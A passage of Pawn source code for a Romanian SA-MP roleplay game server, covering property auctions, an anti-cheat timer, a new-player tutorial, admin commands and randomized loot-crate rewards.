			mysql_format(SQL, gQuery, 128, "UPDATE `houses` SET `Owned`='1',`Owner`='%s',`Value`='0' WHERE `ID`='%d'", _bid_name, id);
			mysql_tquery(SQL, gQuery);
			UpdateLabel(1, id);
		}
		case 2: {
			if(strcmp(BizzInfo[id][bOwner], "The State", true)) {
				format(gString, 128, "Ai pierdut afacerea (%d) deoarece a fost licitata din cauza inactivitatii tale.", id);
				InsertEmail(BizzInfo[id][bOwner], "AdmBot", gString);
				mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Bizz` = '%i' LIMIT 1", id);
				mysql_tquery(SQL, gQuery, "sql_cache_licitatie_id");	
				mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Bizz`='255' WHERE `Bizz`='%d'", id);
				mysql_tquery(SQL, gQuery);				
			}
			if(playerid!=-1) SCMf(playerid, COLOR_YELLOW, "Ai primit afacerea %d cu succes. Felicitari!", id), PlayerInfo[playerid][pBizz] = id;
			BizzInfo[id][bOwned] = 1, BizzInfo[id][bBuyPrice] = 0;
			strmid(BizzInfo[id][bOwner], _bid_name, 0, MAX_PLAYER_NAME);
			mysql_format(SQL, gQuery, 128, "UPDATE users SET `Bizz`='%d' WHERE `ID`='%d'", id, LastPlayer);
			mysql_tquery(SQL, gQuery);
			mysql_format(SQL, gQuery, 128,"UPDATE `bizz` SET `Owned`='1',`Owner`='%s',`BuyPrice`='0' WHERE `ID`='%d'",BizzInfo[id][bOwner],id);
			mysql_tquery(SQL, gQuery);
			UpdateLabel(2,id);
		}
		case 3: {
			if(strcmp(BizzInfo[id][bOwner], "None", true)) {
				format(gString, 128, "Ai pierdut jobul %s deoarece a fost licitata din cauza inactivitatii tale.", JobInfo[id][jName]);
				InsertEmail(BizzInfo[id][bOwner], "AdmBot", gString);
				mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `JobOwner` = '%i' LIMIT 1", BizzInfo[id][bID]);
				mysql_tquery(SQL, gQuery, "sql_cache_licitatie_id");	
				mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `JobOwner`='0' WHERE `JobOwner`='%d'", id);
				mysql_tquery(SQL, gQuery);				
			}
			if(playerid!=-1) {
				SCMf(playerid, COLOR_YELLOW, "Ai primit afacerea %d cu succes. Felicitari!", id), PlayerInfo[playerid][pJobOwner] = id;
				PlayerInfo[playerid][pJobOwner] = id;
			}
			strmid(JobInfo[id][jOwner], _bid_name, 0, MAX_PLAYER_NAME);
			mysql_format(SQL, gQuery, 128, "UPDATE users SET `JobOwner`='%d' WHERE `ID`='%d'", id, LastPlayer);
			mysql_tquery(SQL, gQuery);
			mysql_format(SQL, gQuery, 128,"UPDATE `jobs` SET `Owner` = '%s' WHERE `ID`='%d'", _bid_name,id);
			mysql_tquery(SQL, gQuery);
			UpdateLabel(5,id);
		}
		case 4: {
			if(playerid!=-1) {
				SCMf(playerid, COLOR_YELLOW, "Ai castigat car plate-ul %s cu succes. Felicitari!", NumarLicitatie);
				SendClientMessage(playerid, COLOR_YELLOW, "Contacteaza un administrator pentru a iti seta car plate ul.");
			}
		}
		case 5: {
			if(playerid!=-1) {
				SCMf(playerid, COLOR_YELLOW, "Ai castigat car plate-ul %s cu succes. Felicitari!", NumarLicitatie);
				SendClientMessage(playerid, COLOR_YELLOW, "Contacteaza un administrator pentru a iti seta car plate ul.");
			}
		}
	}
	TipLicitatie = IDLicitatie = 0; LastPlayer=-1;
	return true;
}

redist::sql_cache_licitatie_id() {
	new playerid;
	cache_get_value_name_int(0, "Status", playerid);
	if(playerid==-1) return true;
	switch(TipLicitatie) {
		case 1: SendClientMessage(playerid, COLOR_YELLOW, "Ai ramas fara afacere deoarece a fost luata la licitatie. Motivul: probabil ai fost inactiv."), PlayerInfo[playerid][pHouse] = 999;
		case 2: SendClientMessage(playerid, COLOR_YELLOW, "Ai ramas fara afacere deoarece a fost luata la licitatie. Motivul: probabil ai fost inactiv."), PlayerInfo[playerid][pBizz] = 255;
		case 3: SendClientMessage(playerid, COLOR_YELLOW, "Ai ramas fara job deoarece a fost luata la licitatie. Motivul: probabil ai fost inactiv."), PlayerInfo[playerid][pJobOwner] = 0;
	}
	return true;
}

task DecreaseTimer[5000]() {
	foreach(new i : logged_players) {
		new Float: playerArmour; 
		GetPlayerArmour(i, playerArmour);			
		if(PlayerInfo[i][pAdmin] == 0 && playerArmour > Armour[i]) {
			if(ServerSystem[0] == 0 && FPS2[i] >= 5) NightBot(i, "Cheats (armour-hack)");	
		}
		new Float: playerHealth; 
		GetPlayerArmour(i, playerHealth);			
		if(playerHealth == 100 && PlayerInfo[i][pAdmin] == 0) {
			if(ServerSystem[1] == 0 && FPS2[i] >= 5) NightBot(i, "Cheats (health-hack)");	
		}										
	}	
	return true;
}
redist::nearPNS(playerid) {
	new const Float:paynspray[][] = {
	{1025.05, -1024.23, 32.1}, // LS Temple
	{487.68, -1740.87, 11.13}, // LS Santa Maria
	{-1420.73, 2583.37, 55.56}, // El Quebrados
	{-1904.39, 284.97, 40.75}, // Wang Cars
	{-2425.91, 1022.33, 50.10}, // Juniper Hill
	{1975.60, 2162.16, 10.77}, // LV Redsands
	{2065.38, -1831.51, 13.25}, // Idlewood
	{-99.55, 1118.36, 19.44}, // Fort Carson
	{721.07, -455.94, 16.04}, // Dillimore
	{2393.74, 1493.01, 10.52}, // LV Unused (Pyramid)
	{2160.9758,1414.4552,10.8203} // LV RentCar
	};
	for(new i=0; i<sizeof(paynspray); i++) {
		if(IsPlayerInRangeOfPoint(playerid, 20, paynspray[i][0], paynspray[i][1], paynspray[i][2])) return true;
	}
	return false;
}
redist::nearPNS2(playerid) {
	new const Float:paynspray[][] = {
	{1025.05, -1024.23, 32.1}, // LS Temple
	{487.68, -1740.87, 11.13}, // LS Santa Maria
			{-1420.73, 2583.37, 55.56}, // El Quebrados
			{-1904.39, 284.97, 40.75}, // Wang Cars
			{-2425.91, 1022.33, 50.10}, // Juniper Hill
			{1975.60, 2162.16, 10.77}, // LV Redsands
			{2065.38, -1831.51, 13.25}, // Idlewood
			{-99.55, 1118.36, 19.44}, // Fort Carson
			{721.07, -455.94, 16.04}, // Dillimore
			{2393.74, 1493.01, 10.52}, // LV Unused (Pyramid)
			{2144.9573,1403.8746,11.1395} // LV RentCar
	};
	for(new i=0; i<sizeof(paynspray); i++) if(IsPlayerInRangeOfPoint(playerid, 50, paynspray[i][0], paynspray[i][1], paynspray[i][2])) return true;
	return false;
}
cmd:tutorial(playerid, params[]) {
	if(PlayerInfo[playerid][pTutorial]>=5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai terminat deja tutorialul.");
	for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
	Tutorial(playerid);
	return true;
}
redist::Tutorial(playerid) {
	switch(PlayerInfo[playerid][pTutorial]) {
		case 0: {
			PlayerInfo[playerid][pTutorial] ++;
			UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 1/5 -- ");
			gString[0] = EOS;
			format(gString, 111, "Contul tau este al #%d-lea inregistrat iar in momentul de fata sunt %d/%d playeri connectati.", GetPlayerInregisters(), Iter_Count(Player), MAX_PLAYERS);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, gString);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru ca esti nou pe server, vei fi nevoit sa parcurgi un mic tutorial pentru a cunoaste o parte din server.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ai fost transferat intr-o alta lume virtuala iar pentru inceput trebuie sa dai de permis.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			GameTextForPlayer(playerid, "Step: 1/5", 5000, 1);
			SetPlayerCheckpoint(playerid, 2183.1238,2295.2339,10.8203, 2.0);
			GivePlayerCash(playerid, 1000000);
			GivePlayerBank(playerid, 250000);
			CP[playerid] = 53;
		}
		case 1: {
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 1/5 -- ");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru ca esti nou pe server, vei fi nevoit sa parcurgi un mic tutorial pentru a cunoaste o parte din server.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ai fost transferat intr-o alta lume virtuala iar pentru inceput trebuie sa dai de permis.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			GameTextForPlayer(playerid, "Step: 1/5", 5000, 1);
			if(!CP[playerid]) {
				SetPlayerCheckpoint(playerid, 2183.1238,2295.2339,10.8203, 2.0);
				CP[playerid] = 53;
			}
		}	
		case 2: {
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 2/5 -- ");
			RegisrationStep[playerid][0] = true;
			RegisrationStep[playerid][1] = true;
			RegisrationStep[playerid][2] = true;
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Urmatorul pas pe care trebuie sa-l faci este de a-ti lua telefon, carte de telefon si credit din 24/7");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			SetPlayerCheckpoint(playerid, 2062.6897,2308.9260,10.8203, 2.0);
			CP[playerid] = 53;
			GameTextForPlayer(playerid, "Step: 2/5", 5000, 1);
		}
		case 3: {
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 3/5 -- ");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Urmatorul pas pe care trebuie sa-l faci este de a-ti schimba skinul");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			SetPlayerCheckpoint(playerid, 2101.8936,2257.4214,11.0234, 2.0);
			CP[playerid] = 53;
			GameTextForPlayer(playerid, "Step: 3/5", 5000, 1);
		}
		case 4: {
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 4/5");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ultimul pas pe care trebuie sa-l faci este de a-ti lua un job pentru a putea produce bani.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Poti alege orice job din lista folosind comanda (/jobs).");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Toate joburile sunt profitabile, nu exista un job cel mai bun.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Suma pe care o castigi este diferita in functie de skill, distanta si alte criterii pe care le poti vedea la tutorial de la job.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			GameTextForPlayer(playerid, "Step: 4/5", 5000, 1);
		}
	}
	return true; 
}

cmd:movejob(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	new job, string[256], query[180], Float: Pos[3];
	if(sscanf(params, "i", job)) return SendClientMessage(playerid, COLOR_WHITE, "{F91212}USAGE: {FFFFFF}/movejob <job id>");
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	JobInfo[job][jPosX] = Pos[0];
	JobInfo[job][jPosY] = Pos[1];
	JobInfo[job][jPosZ] = Pos[2];
	DestroyDynamic3DTextLabel(JobInfo[job][jLabel]);
	DestroyDynamicPickup(JobInfo[job][jPickup]);
	format(string, 256, "ID: {018C0D}%d\n{018C0D}%s\n{FFFFFF}Job: {018C0D}%s\n{FFFFFF}Level: {018C0D}%d\n{FFFFFF}Owner: {018C0D}%s\n{FFFFFF}Press {018C0D}Y{FFFFFF} to get job.\nPress {018C0D}N{FFFFFF} to quit job.", job, JobInfo[job][jDescription], JobInfo[job][jName], JobInfo[job][jLevel], JobInfo[job][jOwner]);
	JobInfo[job][jLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF00, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], 25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
	JobInfo[job][jPickup] = CreateDynamicPickup(1275, 23, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], -1, -1, -1, 100.0);
	format(string, sizeof(string), "Job-ul %d a fost mutat in aceasta locatie.", job);
	SendClientMessage(playerid, COLOR_WHITE, string);
	mysql_format(SQL, query, sizeof(query), "UPDATE `jobs` SET `PosX`='%f', `PosY`='%f', `PosZ`='%f' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], job);
	mysql_tquery(SQL, query, "", "");
	return true;
}
cmd:givecrate(playerid, params[]) {
	new id;
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu ai adminul necesar pentru a folosi aceasta comanda.");
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_ERROR, "Usage: {FFFFFF}/givecrate <playerid/name>");
	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_WHITE, "Invalid");
	SetPVarInt(playerid, "id", id);
	gString[0] = EOS;
	for(new i = 0; i < sizeof(CrateName); i++) format(gString, 524, "%s{%s}%s crate\n", gString, CrateColors[i], CrateName[i][general]);
	ShowPlayerDialog(playerid, DIALOG_GIVECRATES, DIALOG_STYLE_LIST, "Give crates", gString, "Select", "Cancel");
	return true;
}
stock totalcrates(playerid,x=0,i=-1) {
	while(++i<sizeof CrateName) x+=PlayerInfo[playerid][pCrates][i];
	return x;
}

redist::ShowCrates(playerid) {
	CratePTD[playerid][0] = CreatePlayerTextDraw(playerid, 265.666626, 176.985184, "");
	PlayerTextDrawLetterSize(playerid, CratePTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, CratePTD[playerid][0], 90.000000, 90.000000);
	PlayerTextDrawAlignment(playerid, CratePTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, CratePTD[playerid][0], 0xFFFFFFFF);
	PlayerTextDrawUseBox(playerid, CratePTD[playerid][0], 0);
	PlayerTextDrawBoxColor(playerid, CratePTD[playerid][0], 0x80808080);
	PlayerTextDrawSetShadow(playerid, CratePTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, CratePTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, CratePTD[playerid][0], 0x0000005A);
	PlayerTextDrawFont(playerid, CratePTD[playerid][0], 5);
	PlayerTextDrawSetProportional(playerid, CratePTD[playerid][0], 0);
	PlayerTextDrawSetSelectable(playerid, CratePTD[playerid][0], 0);
	PlayerTextDrawSetPreviewModel(playerid, CratePTD[playerid][0], 11746);
	PlayerTextDrawSetPreviewRot(playerid, CratePTD[playerid][0], 0.000000, 0.000000, 30.000000, 1.021896);

	CratePTD[playerid][1] = CreatePlayerTextDraw(playerid, 310.500153, 267.985077, "Select~n~action");
	PlayerTextDrawLetterSize(playerid, CratePTD[playerid][1], 0.247997, 1.127110);
	PlayerTextDrawTextSize(playerid, CratePTD[playerid][1], 0.000000, 87.109810);
	PlayerTextDrawAlignment(playerid, CratePTD[playerid][1], 2);
	PlayerTextDrawColor(playerid, CratePTD[playerid][1], 0xFFFFFFFF);
	PlayerTextDrawUseBox(playerid, CratePTD[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, CratePTD[playerid][1], 0x000000FF);
	PlayerTextDrawSetShadow(playerid, CratePTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, CratePTD[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, CratePTD[playerid][1], 0x000000FF);
	PlayerTextDrawFont(playerid, CratePTD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, CratePTD[playerid][1], 1);
	PlayerTextDrawSetSelectable(playerid, CratePTD[playerid][1], 0);

	for(new i=0;i<4;i++) TextDrawShowForPlayer(playerid, CrateTD[i]);
	PlayerTextDrawShow(playerid, CratePTD[playerid][1]);
	PlayerTextDrawShow(playerid, CratePTD[playerid][0]);
	SelectTextDraw(playerid, 0x00c0ffFF);
	player_selected[playerid] = 7;
	return true;
}
redist::startcrates(playerid) {
	ShowCrates(playerid);
	for(new l=0;l<4;l++) TextDrawShowForPlayer(playerid, CrateTD[l]);
	PlayerTextDrawShow(playerid, CratePTD[playerid][1]);
	SetTimerEx(#openPlayerCrate, 600, false, "i", playerid);
	return true;
}

cmd:togcrate(playerid) {
	if(!IsAdmin(playerid, 6)) return true;

	SCMf(playerid, -1, "togCrate: %d", togCrate[playerid]);
	return 1;
}

new crateString[512];
redist::openPlayerCrate(i) {
	CrateTime[i] --;
	new amount, x=CrateModel[i];
	PlayerTextDrawBackgroundColor(i, CratePTD[i][0], 63);
	switch(x) {
		case -1: return SendClientMessage(i, COLOR_LGREEN, "FATAL ERROR: There was an problem with the system crates, check the core. (if you are not an administrator, please make an ticket on panel.b-hood.ro)");
		case 0: {
			switch(random(100)) {
		    	case 0..20: {
		    		amount = loadSkins[e_SKIN_RARE][random(sizeof(loadSkins[e_SKIN_RARE]))];
		            format(gString, 30, "~y~~h~rare~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i);
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a rare crate and won skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						   	
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
			    case 21..60: {
				    amount = RandomEx(1, 5);
		            format(gString, 75, "respect points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1275);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a rare crate and won %dx Respect Points. ))", GetName(i), amount); SCMTA(COLOR_CLIENT, crateString);
					    
					    PlayerInfo[i][pExp] += amount;
					    UpdateVar(i, "Respect", PlayerInfo[i][pExp]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		        default: {
		            amount = RandomEx(1, 500000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a rare crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		    }
		}
		case 1: {
			switch(random(100)) {
		    	case 0..10: {
		    		amount = loadSkins[e_SKIN_EPIC][random(sizeof(loadSkins[e_SKIN_EPIC]))];
		            format(gString, 30, "~y~~h~epic~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a epic crate and won skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				case 11..20: {
				    amount = RandomEx(1, 30);
		            format(gString, 75, "premium points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1247);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a epic crate and won %d Premium Points. ))", GetName(i), amount); SCMTA(COLOR_CLIENT, crateString);
					    
					    PlayerInfo[i][pPremiumPoints] += amount;
					    UpdateVar(i, "GoldPoints", PlayerInfo[i][pPremiumPoints]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
			    case 21..60: {
				    amount = RandomEx(5, 10);
		            format(gString, 75, "respect points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1314);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a epic crate and won %dx Respect Points. ))", GetName(i), amount); SCMTA(COLOR_CLIENT, crateString);
					    
					    PlayerInfo[i][pExp] += amount;
					    UpdateVar(i, "Respect", PlayerInfo[i][pExp]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		        default: {
		            amount = RandomEx(500000, 1000000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a epic crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		    }
		}
		case 2: {
			switch(random(100)) {
		    	case 0..10: {
		    		amount = loadSkins[e_SKIN_LEGENDARY][random(sizeof(loadSkins[e_SKIN_LEGENDARY]))];
		            format(gString, 30, "~y~~h~legendary~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a legendary crate and won skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				case 11..20: {
				    amount = RandomEx(1, 30);
		            format(gString, 75, "premium points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1247);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a legendary crate and won %d Premium Points. ))", GetName(i), amount); SCMTA(COLOR_CLIENT, crateString);
					    
					    PlayerInfo[i][pPremiumPoints] += amount;
					    UpdateVar(i, "GoldPoints", PlayerInfo[i][pPremiumPoints]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		       	case 21..26: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 573);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~dune");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a legendary crate and won Dune. ))", GetName(i));
						    
						    GiveVehicle(i, 573);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }
		        }
		      	case 37..50: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 482);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~burrito");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a legendary crate and won burrito. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 482);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }
		      	}
		   		default: {
		            amount = RandomEx(1000000, 5000000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a legendary crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					   	
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		    }
		}
		case 3: {
			switch(random(100)) {
		    	case 0..25: {
		    		amount = loadSkins[e_SKIN_MYTHIC][random(sizeof(loadSkins[e_SKIN_MYTHIC]))];
		            format(gString, 30, "~y~~h~mythic~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a mythic crate and won skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				case 26..40: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~epic");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a mythic crate and won epic voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
						PlayerInfo[i][pVoucher][1]++;
						save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		       	case 41..56: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 483);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~Camper");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a mythic crate and won Camper. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 483);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }
		        }
		   		default: {
		            amount = RandomEx(5000000, 10000000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a mythic crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					   	
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		    }
		}
		case 4: {
			switch(random(100)) {
		    	case 0..25: {
		    		amount = loadSkins[e_SKIN_TRANSCENDENT][random(sizeof(loadSkins[e_SKIN_TRANSCENDENT]))];
		            format(gString, 30, "~y~~h~transcendent~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a transcendent crate and won skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				case 30..40: {
